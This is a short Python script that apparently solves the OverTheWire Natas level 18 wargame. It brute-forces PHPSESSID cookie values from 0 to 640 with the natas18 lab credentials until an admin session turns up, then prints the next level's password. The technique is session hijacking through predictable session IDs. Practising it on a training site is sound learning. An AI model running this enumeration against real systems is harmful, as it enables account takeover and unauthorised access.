#!/usr/bin/env python3

import requests, re

url = 'http://natas18.natas.labs.overthewire.org/'
user = 'natas18'
natas18_pw = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

for i in range(0, 641):
    r = requests.get(url, auth=(user, natas18_pw), cookies={'PHPSESSID':str(i)})

    print('id: ' + str(i))
    if 'You are an admin. The credentials for the next level are:' in r.text:
        print(re.findall(r'Password:.*', r.text))
        break